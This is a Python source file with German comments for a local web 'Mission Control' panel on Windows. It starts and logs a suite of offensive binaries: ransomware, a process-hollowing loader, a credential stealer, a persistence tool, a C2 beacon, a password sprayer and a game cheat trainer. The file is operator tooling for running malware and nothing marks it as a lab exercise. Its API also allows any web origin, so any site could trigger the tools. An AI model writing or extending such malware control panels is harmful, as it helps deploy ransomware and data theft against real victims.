#!/usr/bin/env python3
# language: Python 3.10+, file: server.py, target: Windows 11
# Mission-Control-Panel — startet die Tools als Subprozesse, liefert Logs
# start: python server.py [port]  ->  http://127.0.0.1:8000
import json
import os
import socket
import subprocess
import threading
import time
import webbrowser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS = os.path.dirname(HERE)

BIN = {
    "ransom":  os.path.join(TOOLS, "ransomware", "ransom.exe"),
    "loader":  os.path.join(TOOLS, "loader", "hollow.exe"),
    "stealer": os.path.join(TOOLS, "stealer", "steal.exe"),
    "persist": os.path.join(TOOLS, "persist", "persist.exe"),
    "beacon":  os.path.join(TOOLS, "c2", "beacon.exe"),
    "spray":   os.path.join(TOOLS, "spray", "spray.exe"),
    "trainer": os.path.join(TOOLS, "cheat", "trainer_gui.exe"),
}

LOGS = {}          # tool -> [line, ...]
LOCK = threading.Lock()


def run_tool(tool):
    exe = BIN.get(tool)
    if not exe or not os.path.exists(exe):
        return {"ok": False, "error": f"{exe or tool} nicht gefunden — erst bauen (cl ...)"}
    try:
        p = subprocess.Popen([exe], cwd=os.path.dirname(exe),
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True)
    except Exception as e:
        return {"ok": False, "error": str(e)}

    def pump(proc, name):
        lines = []
        for line in proc.stdout:
            line = line.rstrip()
            lines.append(line)
            with LOCK:
                LOGS.setdefault(name, []).append(line)
        with LOCK:
            LOGS.setdefault(name, []).append(f"[ende] exit={proc.wait()}")
    threading.Thread(target=pump, args=(p, tool), daemon=True).start()
    return {"ok": True, "msg": f"{tool} gestartet (pid={p.pid})"}


class Handler(BaseHTTPRequestHandler):
    def _serve_static(self, path):
        # statische Dateien aus HERE — nur von hier aus, kein Traversal
        if path in ("/", "/index.html"):
            rel = "index.html"
        else:
            rel = path.lstrip("/")
        target = os.path.normpath(os.path.join(HERE, rel))
        if os.path.commonpath([HERE, target]) == HERE and os.path.isfile(target):
            ctype = "text/html; charset=utf-8" if target.endswith(".html") else (
                "image/png" if target.endswith(".png") else "application/octet-stream")
            with open(target, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return
        self._send({"ok": False, "error": "unbekannt"}, 404)

    def _send(self, obj, code=200):
        data = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path == "/api/status":
            self._send({
                "ok": True,
                "host": socket.gethostname(),
                "pid": os.getpid(),
                "session": os.environ.get("SESSIONNAME", "console"),
            })
        elif self.path.startswith("/api/log"):
            tool = self.path.split("?tool=")[-1]
            with LOCK:
                lines = list(LOGS.get(tool, []))
            self._send({"ok": True, "log": "\n".join(lines[-40:])})
        else:
            self._serve_static(self.path)

    def do_POST(self):
        if self.path == "/api/run":
            length = int(self.headers.get("Content-Length", 0))
            try:
                body = json.loads(self.rfile.read(length) or b"{}")
            except Exception:
                body = {}
            self._send(run_tool(body.get("tool", "")))
        else:
            self._send({"ok": False, "error": "unbekannt"}, 404)

    def log_message(self, *a):
        pass


def main():
    port = 8000
    srv = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    url = f"http://127.0.0.1:{port}/index.html"
    print(f"[*] Mission Control läuft: {url}")
    threading.Timer(0.8, lambda: webbrowser.open(url)).start()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        srv.shutdown()


if __name__ == "__main__":
    main()
